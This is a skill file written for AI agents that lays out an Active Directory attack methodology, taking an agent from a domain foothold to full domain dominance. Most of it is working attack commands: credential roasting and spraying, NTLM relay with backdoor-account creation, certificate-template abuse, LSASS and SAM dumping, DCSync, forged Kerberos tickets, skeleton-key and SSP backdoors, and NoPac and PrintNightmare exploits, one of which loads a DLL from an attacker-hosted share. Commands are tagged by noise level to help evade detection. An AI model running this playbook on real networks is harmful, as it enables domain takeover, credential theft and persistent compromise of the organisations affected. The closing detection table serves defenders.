---
name: active-directory-technique
description: "Active Directory attack methodology for AI agents. Covers domain enumeration (BloodHound, PowerView), credential attacks (Kerberoasting, AS-REP, password spray), NTLM relay chains (Coercer + Responder + ntlmrelayx), certificate abuse (ESC1-13 via Certipy), lateral movement (crackmapexec, evil-winrm, impacket), domain trust escalation (child-to-parent, cross-forest), and domain dominance (DCSync, Golden/Silver/Diamond ticket, persistence). Use after post-exploit-technique delivers a domain-joined foothold or domain credential."
license: MIT
compatibility: "Windows Active Directory environments; Linux attack host; domain-joined or credential-in-hand required for most phases"
metadata:
  author: AeonDave
  version: "2.0"
  category: offensive-techniques
  language: multi
---

# Active Directory Technique

Goal: move from **domain foothold or low-privilege credential to domain dominance** via the shortest confirmed path.

## When this technique applies

- Shell or credential on a domain-joined host (from post-exploit-technique).
- Valid domain user credential (from phishing, spray, NTLM relay, or credential harvest).
- Network access to DC ports (88/Kerberos, 389/LDAP, 445/SMB, 636/LDAPS).
- Red team / pentest requiring AD attack path documentation.
- Need to validate ACL-based privilege paths such as `GenericAll`, `WriteDacl`, `WriteOwner`, or `GenericWrite`.

## Boundary with other skills

- **Input from `post-exploit-technique`**: shell on domain host, harvested NTLM hash or plaintext.
- **Input from `network-technique` §Case E**: NTLM relay setup (Responder + ntlmrelayx).
- **Recon phase**: use `recon-technique` for initial attack surface mapping; this skill assumes you are inside the domain.
- **Cracking**: NTLM/Kerberos hashes from this skill → `cracking-technique` for offline cracking.
- **Lateral movement tooling**: `network-technique` §Case D/H for proxychains, crackmapexec basics.

## Initial triage

Before taking action, classify the starting point and choose the shortest low-noise path.

- **Starting state**: do you have a shell on a domain host, a low-priv domain credential, relayed auth, or only network reachability?
- **First questions**: what domain are you in, what are the lockout rules, is SMB signing enforced, is AD CS present, and what high-value principals or paths already exist?
- **Immediate actions**: confirm domain context, collect the minimum graph/evidence needed to rank attack paths, then choose one path at a time.
- **Tool-family direction**: start with AD graph/enumeration skills (`bloodhound`, `sharphound`, `powerview`, `enum4linux`); switch to credential attacks (`kerbrute`, `rubeus`, `impacket`) only after a path is justified; use lateral-movement tool skills (`crackmapexec`, `evil-winrm`, `impacket`) after a target and credential type are known.
- **Escalation rule**: prefer the shortest confirmed privilege path over broad spraying or host-by-host movement.

## Agent operating model

```
Entry point classification:
  A. Shell on domain host (no creds yet) → Phase 1 → Phase 2
  B. Low-privilege domain credential → Phase 2 directly
  C. Network access only (no creds) → Phase 3 (NTLM relay/poisoning) first
  D. Child domain compromised → Phase 7 (domain trust escalation)

Loop:
  1. Domain enumeration — map attack surface.
  2. Credential attacks — obtain additional hashes/tickets.
  3. NTLM relay & poisoning — capture and relay without cracking.
  4. Certificate abuse — obtain domain auth via ADCS.
  5. Lateral movement — reach high-value targets.
  6. Domain dominance — DCSync, Golden/Silver/Diamond ticket, persistence.
  7. Domain trust escalation — child-to-parent, cross-forest.

Shortest path: BloodHound path from current user to Domain Admin → execute that path.

OPSEC noise levels (tag every command before execution):
  QUIET    : LDAP/DNS queries, BloodHound stealth collection, Kerbrute enum, Snaffler targeted
  MODERATE : Standard SMB/LDAP enum, Kerberoasting, AS-REP, Coercer, Inveigh/Responder
  LOUD     : DCSync, PSExec (creates service), BloodHound -c All, Mimikatz on host, NoPac
```

Do not brute-force domain accounts blindly — AD lockout policies are common. Spray once with confirmed policy.

---

## Phase 1 — Domain enumeration

Map the domain before attacking. BloodHound gives the full graph; PowerView for targeted queries.

### BloodHound collection

```powershell
# SharpHound (on target, Windows)
.\SharpHound.exe -c All --zipfilename bh_data.zip

# bloodhound-python (from attack host, Linux)
bloodhound-python -u <user> -p <pass> -d <domain> -ns <dc_ip> -c All
```

Import zip into BloodHound. Key queries:
- **Shortest path to DA**: `Shortest Paths to Domain Admins from Owned Principals`
- **Kerberoastable users**: `List all Kerberoastable Accounts`
- **AS-REP roastable**: `Find AS-REP Roastable Users`
- **Unconstrained delegation**: `Find Computers with Unconstrained Delegation`
- **LAPS**: `Find computers where LAPS is enabled`
- **Owned → admin paths**: mark each compromised principal as Owned

See `offensive-tools/windows/bloodhound/`, `offensive-tools/windows/sharphound/`.

### PowerView targeted queries

```powershell
Import-Module .\PowerView.ps1

# Domain context
Get-Domain; Get-DomainController
Get-DomainPolicy | Select -ExpandProperty SystemAccess  # lockout policy!

# Users and groups
Get-DomainUser -Properties samaccountname,memberof,useraccountcontrol,pwdlastset,lastlogon
Get-DomainGroupMember "Domain Admins"
Get-DomainGroupMember "Enterprise Admins"

# Computers
Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp

# ACL abuse paths
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "<username>"}

# Local admin enumeration (noisy — avoid unless targeted)
Find-LocalAdminAccess
```

See `offensive-tools/windows/powerview/`.

Validate ACL edges before acting on them. BloodHound pathing is the starting point; live DACL confirmation prevents stale graph edges and helps choose the lowest-change proof path. Use `references/ad-acl-abuse.md` for rights-to-impact mapping and safe execution discipline.

### enum4linux-ng (from Linux attack host)

```bash
# Full domain enumeration via SMB/RPC
enum4linux-ng -A -u <user> -p <pass> <dc_ip>

# Users, groups, shares, password policy
enum4linux-ng -U -G -S -P -u <user> -p <pass> <dc_ip>
```

See `offensive-tools/windows/enum4linux/`.

→ Full enumeration patterns: `references/ad-enumeration.md`.

---

## Phase 2 — Credential attacks

### Kerberoasting

Request TGS for service accounts → crack offline. Works with any valid domain user.

```bash
# impacket
impacket-GetUserSPNs domain.local/user:pass -dc-ip <dc_ip> -request -outputfile kerberoast.txt

# rubeus (on target Windows)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt /format:hashcat

# Crack with hashcat (mode 13100)
hashcat -m 13100 kerberoast.txt /path/to/rockyou.txt -r rules/best64.rule
```

High-value targets: SPN accounts with high privilege (check BloodHound → Kerberoastable).

### AS-REP Roasting

Accounts with `DONT_REQ_PREAUTH` set → get encrypted hash without authentication.

```bash
# impacket — no credentials needed
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip <dc_ip> -format hashcat -outputfile asrep.txt

# impacket — with credentials (enumerate automatically)
impacket-GetNPUsers domain.local/user:pass -dc-ip <dc_ip> -request -format hashcat -outputfile asrep.txt

# rubeus (on target)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Crack with hashcat (mode 18200)
hashcat -m 18200 asrep.txt /path/to/rockyou.txt
```

### Password spraying

Test one password across many accounts. Respects lockout — always check policy first.

```bash
# Check lockout policy before spraying
enum4linux-ng -P -u <user> -p <pass> <dc_ip>
net accounts /domain   # from Windows

# crackmapexec spray (SMB)
crackmapexec smb <dc_ip> -u users.txt -p 'Password2024!' --continue-on-success

# kerbrute spray (Kerberos — lower noise than SMB)
kerbrute passwordspray -d domain.local --dc <dc_ip> users.txt 'Password2024!'

# DomainPasswordSpray.ps1 (from domain-joined Windows — auto-enumerates users)
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password 'Welcome1' -OutFile spray_success -ErrorAction SilentlyContinue

# trevorspray — LDAP spray (staggered, lockout-aware)
trevorspray -u users.txt -p 'Password2024!' --host <dc_ip> --lockout-threshold 3
```

See `offensive-tools/windows/kerbrute/`, `offensive-tools/windows/trevorspray/`.

### LAPS & gMSA password extraction

```bash
# LAPS — read local admin passwords from AD (requires ReadLAPSPassword rights)
nxc ldap <dc_ip> -u user -p pass -M laps
nxc smb <subnet>/24 -u user -p pass --laps    # authenticate using LAPS passwords

# gMSA — read managed service account passwords (requires ReadGMSAPassword)
nxc ldap <dc_ip> -u user -p pass -M gmsa
python3 gMSADumper.py -u user -p pass -d domain.local -l <dc_ip>
```

→ Full LAPS/gMSA extraction patterns: `references/ad-enumeration.md`.

→ Full attack patterns, ticket abuse, delegation exploits: `references/kerberos-attacks.md`.

---

## Phase 3 — NTLM relay & network poisoning

Capture NTLM authentication via relay or poisoning. Highly effective in environments without SMB signing.

### LLMNR/NBT-NS/mDNS poisoning

Passive credential capture — respond to broadcast name resolution queries to intercept NTLM hashes.

```bash
# Responder (Linux attack host) — full poisoning
sudo responder -I eth0 -wv
# Hashes: /usr/share/responder/logs/ → hashcat -m 5600

# Analyze mode (passive, no poisoning — useful for recon)
sudo responder -I eth0 -A
```

```powershell
# Inveigh (from compromised Windows host)
Import-Module .\Inveigh.ps1
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y

# C# version (standalone, no PowerShell dependency)
.\Inveigh.exe -FileOutput Y -NBNS Y -mDNS Y
```

See `offensive-tools/network/responder/`, `offensive-tools/windows/inveigh/`.

### Credential hunting (Snaffler)

```powershell
# Automated share enumeration + content analysis for secrets
.\Snaffler.exe -s -d domain.local -o snaffler.log -v data
```

See `offensive-tools/windows/snaffler/`.

### SMB signing check

```bash
crackmapexec smb <subnet>/24 --gen-relay-list relay_targets.txt
# relay_targets.txt = hosts without SMB signing enabled
nmap --script smb2-security-mode -p 445 <subnet>/24
```

### Coercion + relay

```bash
# Step 1: Start ntlmrelayx (attack host — relay to target without signing)
impacket-ntlmrelayx -tf relay_targets.txt -smb2support [-i | -c <cmd> | -socks]

# Step 2: Coerce authentication from victim host
# Coercer — tries all known coercion methods (PetitPotam, PrinterBug, DFSCoerce, etc.)
python3 Coercer.py coerce -u <user> -p <pass> -d domain.local -t <victim_host> -l <attacker_ip>

# Alternative: Responder (passive — wait for auth from network traffic)
responder -I eth0 -wv
```

### Relay impact options

- `-i` → interactive SMB shell on relayed session
- `-c "net user backdoor P@ss123 /add && net localgroup Administrators backdoor /add"` → command execution
- `-socks` → SOCKS proxy through relayed session (use with proxychains)
- `--delegate-access` → Resource-Based Constrained Delegation abuse (creates computer account, gains S4U2self)

→ Full relay chain patterns: `references/ntlm-relay.md`.

---

## Phase 4 — Certificate abuse (ADCS)

Active Directory Certificate Services (ADCS) misconfigurations allow privilege escalation to DA without touching LSASS. Certipy now supports ESC1-16.

### Enumeration

```bash
# certipy — enumerate ADCS from Linux
certipy find -u <user>@domain.local -p <pass> -dc-ip <dc_ip> -vulnerable -stdout

# certify (Windows)
.\Certify.exe find /vulnerable
```

### ESC1 — Enrollee supplies Subject Alternative Name

Most common misconfiguration: template allows enrollee to specify any SAN (including DA UPN).

```bash
# Request certificate as Domain Admin
certipy req -u <user>@domain.local -p <pass> -ca <CA-name> -template <vuln-template> \
  -upn administrator@domain.local -dc-ip <dc_ip>

# Authenticate with certificate → get TGT → NTLM hash
certipy auth -pfx administrator.pfx -domain domain.local -username administrator -dc-ip <dc_ip>

# Use hash for pass-the-hash or secretsdump
```

### ESC8 — NTLM relay to AD CS HTTP endpoint

Relay NTLM auth to ADCS web enrollment → obtain certificate for domain controller → DCSync.

```bash
# Relay to ADCS instead of SMB
impacket-ntlmrelayx -t http://<ADCS-server>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce DC to authenticate to attacker
python3 Coercer.py coerce -u <user> -p <pass> -d domain.local -t <dc_ip> -l <attacker_ip>

# Get DC certificate → authenticate → DCSync
certipy auth -pfx dc.pfx -domain domain.local -username dc$ -dc-ip <dc_ip>
impacket-secretsdump -k -no-pass domain.local/dc$@<dc_ip>
```

See `offensive-tools/windows/certipy/`.

→ Full ESC1-13 chains, ADCS enumeration, Shadow Credentials, Golden Certificate: `references/certificate-abuse.md`.

---

## Phase 5 — Lateral movement

Move between hosts using confirmed credentials or tickets.

### SMB — command execution

```bash
# crackmapexec — validate + execute (pass plaintext, hash, or ticket)
crackmapexec smb <target> -u <user> -p <pass>                    # login test
crackmapexec smb <target> -u <user> -H <ntlm_hash>              # pass-the-hash
crackmapexec smb <target> -u <user> -p <pass> -x "whoami"       # command execution
crackmapexec smb <subnet>/24 -u <user> -p <pass> --local-auth   # spray with local creds

# impacket psexec / wmiexec / smbexec (different noise levels)
impacket-psexec domain.local/user:pass@<target>          # SYSTEM shell (noisy — creates service)
impacket-wmiexec domain.local/user:pass@<target>         # medium noise, no service
impacket-smbexec domain.local/user:pass@<target>         # lower noise
impacket-psexec domain.local/user@<target> -hashes :NTLMHASH  # pass-the-hash
```

### WinRM — PowerShell remoting

```bash
# evil-winrm (5985/5986 open, user in Remote Management Users)
evil-winrm -i <target> -u <user> -p <pass>
evil-winrm -i <target> -u <user> -H <ntlm_hash>    # pass-the-hash

# Load PowerShell scripts/modules
evil-winrm -i <target> -u <user> -p <pass> -s /path/to/scripts/
```

### Pass-the-Ticket (Kerberos)

```bash
# Import ticket (from Rubeus or secretsdump)
impacket-ticketConverter <ticket.kirbi> ticket.ccache
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass domain.local/<user>@<target>

# Rubeus (Windows)
.\Rubeus.exe ptt /ticket:<base64_ticket>
```

### Shadow Credentials (GenericWrite → account takeover without password change)

```bash
# certipy shadow — inject msDS-KeyCredentialLink → authenticate via PKINIT
certipy shadow auto -u attacker@domain.local -p pass -account <target_user> -dc-ip <dc_ip>
# Output: target user NTLM hash

# pywhisker — alternative tool
python3 pywhisker.py -d domain.local -u attacker -p pass --target <target_user> --action add
# Then use PKINITtools:
python3 gettgtpkinit.py -cert-pem cert.pem -key-pem priv.pem domain.local/<target_user> target.ccache
python3 getnthash.py -key <session_key> domain.local/<target_user>
```

### MSSQL lateral movement

```bash
# Enumerate SQL instances via PowerUpSQL
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain

# Login and enable xp_cmdshell
Get-SQLQuery -Instance "<host>,1433" -username "domain\user" -password "pass" -query 'Select @@version'

# impacket mssqlclient
impacket-mssqlclient domain.local/user:pass@<target> -windows-auth
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

BloodHound Cypher query for SQL admin paths:
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

See `offensive-tools/windows/crackmapexec/`, `offensive-tools/windows/evil-winrm/`, `offensive-tools/windows/impacket/`.

→ Full lateral movement patterns: `references/lateral-movement-ad.md`.

### Credential extraction (post local-admin)

Once local admin on a host, dump credentials to pivot further.

```bash
# LSASS dump via procdump (SysInternals — less suspicious than mimikatz on disk)
procdump64.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp
# Parse offline with mimikatz
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"

# Mimikatz live (requires SeDebugPrivilege)
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Credential Manager stored creds
.\mimikatz.exe "privilege::debug" "sekurlsa::credman" "exit"
# or: vault::cred

# Enable WDigest cleartext caching (requires reboot or new logon)
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
# After next logon, sekurlsa::logonpasswords will show cleartext passwords

# Registry SAM/SYSTEM/SECURITY dump (offline cracking — avoids touching LSASS)
reg.exe save hklm\sam C:\Windows\Temp\sam.save
reg.exe save hklm\system C:\Windows\Temp\system.save
reg.exe save hklm\security C:\Windows\Temp\security.save
# Crack offline:
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL

# CrackMapExec — remote credential dump (SAM, LSA, NTDS)
crackmapexec smb <target> -u admin -p pass --sam       # local SAM hashes
crackmapexec smb <target> -u admin -p pass --lsa       # LSA secrets
crackmapexec smb <dc_ip> -u admin -p pass --ntds       # NTDS.dit (DA required)
```

---

## Phase 6 — Domain dominance

### DCSync — dump all domain hashes

Requires: Domain Admin, or account with `Replicating Directory Changes` + `Replicating Directory Changes All`.

```bash
# impacket secretsdump (from Linux)
impacket-secretsdump domain.local/administrator:pass@<dc_ip>
impacket-secretsdump -k -no-pass domain.local/administrator@<dc_ip>  # with ticket

# mimikatz (Windows)
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /all" "exit"

# Target specific user
impacket-secretsdump domain.local/administrator@<dc_ip> -just-dc-user krbtgt
```

Output: NTLM hashes for every domain user, including `krbtgt` (needed for Golden Ticket).

### Golden Ticket

Forge TGTs for any user, valid for 10 years. Requires `krbtgt` hash.

```bash
# mimikatz
.\mimikatz.exe "kerberos::golden /domain:domain.local /sid:<domain_SID> /rc4:<krbtgt_ntlm> /user:Administrator /id:500 /ptt" "exit"

# impacket ticketer
impacket-ticketer -nthash <krbtgt_ntlm> -domain-sid <sid> -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@<dc_ip>
```

### Silver Ticket

Forge TGS for a specific service without touching DC. Requires service account hash.

```bash
# mimikatz — forge TGS for CIFS on target
.\mimikatz.exe "kerberos::golden /domain:domain.local /sid:<sid> /target:<host.domain.local> /service:cifs /rc4:<service_account_ntlm> /user:Administrator /ptt" "exit"
```

### Diamond Ticket

Modify a legitimate TGT rather than forging from scratch — stealthier than Golden Ticket. Requires `krbtgt` AES256 key + any valid user credential.

```bash
# Basic Diamond Ticket — request legitimate TGT, decrypt, modify PAC, re-encrypt
.\Rubeus.exe diamond /krbkey:<aes256_krbtgt> /user:<low_priv_user> /password:<pass> \
  /enctype:aes /domain:domain.local /dc:<dc_fqdn> /ticketuser:Administrator /ticketuserid:500 /nowrap

# With /tgtdeleg — avoids sending credentials on the wire
.\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 \
  /krbkey:<aes256_krbtgt> /nowrap

# OPSEC-enhanced (2024+) — /ldap pulls real PAC, /opsec matches Windows AS-REQ flow
.\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 \
  /krbkey:<aes256_krbtgt> /ldap /opsec /nowrap
```

### AD persistence

```powershell
# AdminSDHolder abuse — backdoor ACL propagation every 60 min
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity <backdoor_user> -Rights All

# Skeleton key (memory only, non-persistent)
.\mimikatz.exe "privilege::debug" "misc::skeleton" "exit"
# All domain users now accept "mimikatz" as password

# SSP backdoor (credentials logged to mimilsa.log)
.\mimikatz.exe "privilege::debug" "misc::memssp" "exit"

# Golden Certificate (CA private key → forge any cert indefinitely)
certipy ca -backup -u admin@domain.local -p pass -ca 'CA-Name' -target <ca_host>
certipy forge -ca-pfx ca.pfx -upn administrator@domain.local
```

→ Full persistence techniques: `references/domain-persistence.md`.

---

## Phase 7 — Domain trust escalation

Escalate from child domain to parent domain or across forest trusts.

### Child-to-parent escalation (ExtraSID Golden/Diamond Ticket)

Requires: `krbtgt` hash from child domain + Enterprise Admins SID from parent.

```bash
# Gather requirements
impacket-secretsdump child.domain.local/admin@<child_dc> -just-dc-user CHILD/krbtgt
impacket-lookupsid child.domain.local/admin@<parent_dc> | grep "Enterprise Admins"

# Mimikatz — golden ticket with /sids
.\mimikatz.exe "kerberos::golden /user:hacker /domain:CHILD.DOMAIN.LOCAL /sid:<child_sid> /krbtgt:<krbtgt_hash> /sids:<parent_EA_sid>-519 /ptt" "exit"

# Diamond Ticket (stealthier) — with ExtraSID
.\Rubeus.exe diamond /tgtdeleg /ticketuser:administrator /ticketuserid:500 /groups:512 \
  /sids:<parent_EA_sid>-519 /krbkey:<child_krbtgt_aes256> /nowrap

# Linux — forge inter-realm ticket
impacket-ticketer -nthash <krbtgt_hash> -domain CHILD.DOMAIN.LOCAL -domain-sid <child_sid> \
  -extra-sid <parent_EA_sid>-519 hacker
export KRB5CCNAME=hacker.ccache
impacket-psexec -k -no-pass CHILD.DOMAIN.LOCAL/hacker@<parent_dc_fqdn>
```

### Cross-forest Kerberoasting

```bash
.\Rubeus.exe kerberoast /domain:OTHERFOREST.LOCAL /user:mssqlsvc /nowrap
impacket-GetUserSPNs -target-domain OTHERFOREST.LOCAL MYFOREST.LOCAL/user:pass -request
```

→ Full trust attack chains, trust key abuse, SID history: `references/domain-trust-attacks.md`.

---

## Bleeding-edge vulnerabilities

### NoPac (CVE-2021-42278 + CVE-2021-42287)

Escalate from any domain user to DA by spoofing DC sAMAccountName.

```bash
python3 noPac.py domain.local/user:pass -dc-ip <dc_ip> -dc-host <dc_hostname> --impersonate administrator -dump
# Check: crackmapexec ldap <dc_ip> -u user -p pass -M maq
```

### PrintNightmare (CVE-2021-34527)

```bash
impacket-rpcdump <target> | grep -i spoolsv  # verify spooler
python3 CVE-2021-34527.py domain.local/user:pass@<target> '\\<attacker_ip>\share\evil.dll'
```

### PetitPotam (MS-EFSRPC coercion)

```bash
python3 PetitPotam.py -u user -p pass -d domain.local <attacker_ip> <dc_ip>  # relay to ADCS ESC8
```

→ Domain persistence, DCShadow, Golden Certificate: `references/domain-persistence.md`.

---

## Detection signatures

Key Windows Event IDs triggered by AD attacks:

| Event ID | Meaning | Attack it reveals |
|----------|---------|-------------------|
| 4624 | Successful logon | Lateral movement, PTH |
| 4625 | Failed logon | Password spraying |
| 4648 | Explicit credential logon | Pass-the-Hash |
| 4662 | Operation on directory object | DCSync |
| 4741 | Computer account created | NoPac, RBCD setup |
| 4742 | Computer account modified | NoPac (sAMAccountName rename) |
| 4768 | Kerberos TGT requested | Golden/Diamond Ticket reuse |
| 4769 | Kerberos service ticket requested | Kerberoasting, cross-forest |
| 4771 | Kerberos pre-auth failed | AS-REP Roasting |
| 4720 | User account created | RBCD / persistence |
| 4738 | User account changed | ACL abuse, UPN change (ESC9) |
| 4765 | SID History added | SID History injection |
| 5136 | Directory object modified | DACL changes, RBCD, AdminSDHolder |
| 7045 | Service installed | PSExec, Skeleton Key |

MITRE ATT&CK primary mappings:

| Phase | TTPs |
|-------|------|
| Enumeration | T1087.002, T1069.002, T1018 |
| Kerberos attacks | T1558.003 (Kerberoasting), T1558.004 (AS-REP), T1558.001 (Golden/Diamond), T1558.002 (Silver) |
| Credential access | T1003.006 (DCSync), T1557.001 (LLMNR/NBT-NS), T1649 (ADCS) |
| Lateral movement | T1550.002 (PTH), T1550.003 (PTT), T1021.002 (SMB), T1021.006 (WinRM) |
| Persistence | T1484 (Domain Policy), T1098 (AdminSDHolder), T1556.001 (SSP/Skeleton) |
| Trust escalation | T1134.005 (SID History), T1558.001 (ExtraSID Golden) |

---

## Quality gates

- Lockout policy confirmed before any spray.
- BloodHound path identified before blind lateral movement attempts.
- NTLM relay verified: target list only includes hosts without SMB signing.
- Certificate abuse: template vulnerability class confirmed before request.
- DCSync: krbtgt hash validated (test decrypt with known user hash).
- Domain trust: child domain SID and parent EA SID confirmed before ticket forging.
- Diamond Ticket: AES256 key used (RC4 triggers detection).
- NoPac: MachineAccountQuota > 0 verified before exploitation.
- All escalation steps documented with exact commands and timestamps.
- Evidence files named: `{tool}_{domain}_{YYYYMMDD_HHMMSS}.{ext}`.

## Anti-patterns

- Password spraying without lockout threshold check → account lockouts → detection.
- BloodHound collection with `-c All` on large domain without rate control → logs flooded.
- Treating DCSync hash dump as "complete" without validating krbtgt for Golden Ticket.
- Using mimikatz directly on EDR-monitored host without evasion → immediate alert.
- Lateral movement to every reachable host instead of targeting BloodHound DA path.
- Golden Ticket with RC4 encryption → detectable by etype mismatch with domain policy.
- Running Snaffler against entire domain without targeting → excessive SMB traffic.
- Skeleton Key on DC without confirming LSASS protection status → crash risk.

## Resources

- [references/ad-enumeration.md](references/ad-enumeration.md) — BloodHound query catalog, PowerView cheatsheet, LDAP query patterns, trust enumeration, Snaffler, LLMNR/NBT-NS poisoning, credential hunting.
- [references/ad-acl-abuse.md](references/ad-acl-abuse.md) — ACL abuse methodology: GenericAll, WriteDACL, WriteOwner, GenericWrite, shadow credentials, RBCD, and reversible proof paths.
- [references/kerberos-attacks.md](references/kerberos-attacks.md) — Kerberoasting, AS-REP, delegation abuse (unconstrained/constrained/RBCD), Diamond Ticket, NoPac/sAMAccountName spoofing, double-hop workarounds, ticket forgery.
- [references/ntlm-relay.md](references/ntlm-relay.md) — Relay chain setup, coercion methods, relay target selection, SOCKS relay for tool chaining.
- [references/certificate-abuse.md](references/certificate-abuse.md) — ADCS ESC1-13 attack chains, certificate auth, CA enumeration, PKINIT, shadow credentials, Golden Certificate.
- [references/lateral-movement-ad.md](references/lateral-movement-ad.md) — Protocol × credential type matrix, WMI/DCOM/RDP/WinRM/SMB patterns, detection signatures to avoid.
- [references/domain-trust-attacks.md](references/domain-trust-attacks.md) — Child-to-parent escalation, cross-forest Kerberoasting, trust key abuse, SID history, Diamond Ticket with ExtraSID.
- [references/domain-persistence.md](references/domain-persistence.md) — AdminSDHolder, Skeleton Key, SSP backdoor, DSRM abuse, DCShadow, Golden Certificate persistence.
